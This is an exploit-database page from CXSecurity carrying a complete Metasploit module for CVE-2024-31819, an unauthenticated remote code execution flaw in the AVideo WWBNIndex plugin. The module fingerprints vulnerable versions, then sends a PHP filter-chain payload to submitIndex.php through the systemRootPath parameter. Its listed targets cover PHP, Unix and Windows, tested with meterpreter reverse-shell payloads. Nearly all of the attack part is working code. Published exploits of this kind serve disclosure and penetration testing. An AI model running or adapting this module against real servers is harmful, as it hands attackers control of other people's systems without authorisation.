---
title: AVideo WWBNIndex Plugin Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024050064
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-23
fetch_date: 2025-10-06T16:48:22.429988
---

# AVideo WWBNIndex Plugin Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AVideo WWBNIndex Plugin Unauthenticated Remote Code Execution** **2024.05.22**  Credit:  **[Valentin Lobstein](https://cxsecurity.com/author/Valentin%2BLobstein/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::HTTP::PhpFilterChain
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'AVideo WWBNIndex Plugin Unauthenticated RCE',
'Description' => %q{
This module exploits an unauthenticated remote code execution (RCE) vulnerability
in the WWBNIndex plugin of the AVideo platform. The vulnerability exists within the
`submitIndex.php` file, where user-supplied input is passed directly to the `require()`
function without proper sanitization. By exploiting this, an attacker can leverage the
PHP filter chaining technique to execute arbitrary PHP code on the server. This allows
for the execution of commands and control over the affected system. The exploit is
particularly dangerous because it does not require authentication, making it possible
for any remote attacker to exploit this vulnerability.
},
'Author' => [
'Valentin Lobstein'
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2024-31819'],
['URL', 'https://github.com/WWBN/AVideo'],
['URL', 'https://chocapikk.com/posts/2024/cve-2024-31819']
],
'Platform' => ['php', 'unix', 'linux', 'win'],
'Arch' => [ARCH\_PHP, ARCH\_CMD],
'Targets' => [
[
'PHP In-Memory',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP
# tested with php/meterpreter/reverse\_tcp
}
],
[
'Unix In-Memory',
{
'Platform' => ['unix', 'linux'],
'Arch' => ARCH\_CMD
# tested with cmd/linux/http/x64/meterpreter/reverse\_tcp
}
],
[
'Windows In-Memory',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD
# tested with cmd/windows/http/x64/meterpreter/reverse\_tcp
}
],
],
'Privileged' => false,
'DisclosureDate' => '2024-04-09',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
},
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 443,
'FETCH\_WRITABLE\_DIR' => '/tmp'
}
)
)
end
def exploit
php\_code = "<?php #{target['Arch'] == ARCH\_PHP ? payload.encoded : "system(base64\_decode('#{Rex::Text.encode\_base64(payload.encoded)}'));"} ?>"
filter\_payload = generate\_php\_filter\_payload(php\_code)
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'plugin', 'WWBNIndex', 'submitIndex.php'),
'ctype' => 'application/x-www-form-urlencoded',
'data' => "systemRootPath=#{filter\_payload}"
)
print\_error("Server returned #{res.code}. Successful exploit attempts should not return a response.") if res&.code
end
def check
res = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, 'index.php'),
'method' => 'GET',
'follow\_redirect' => true
})
return CheckCode::Unknown('Failed to connect to the target.') unless res
return CheckCode::Unknown("Unexpected HTTP response code: #{res.code}") unless res.code == 200
version\_match = res.body.match(/Powered by AVideo ® Platform v([\d.]+)/) || res.body.match(/<!--.\*?v:([\d.]+).\*?-->/m)
return CheckCode::Unknown('Unable to extract AVideo version.') unless version\_match && version\_match[1]
version = Rex::Version.new(version\_match[1])
plugin\_check = send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, 'plugin', 'WWBNIndex', 'submitIndex.php'),
'method' => 'GET'
})
unless plugin\_check&.code == 200
CheckCode::Safe('Vulnerable plugin WWBNIndex was not detected')
end
if version.between?(Rex::Version.new('12.4'), Rex::Version.new('14.2'))
return CheckCode::Appears("Detected vulnerable AVideo version: #{version}, with vulnerable plugin WWBNIndex running.")
end
CheckCode::Safe("Detected non-vulnerable AVideo version: #{version}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050064)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top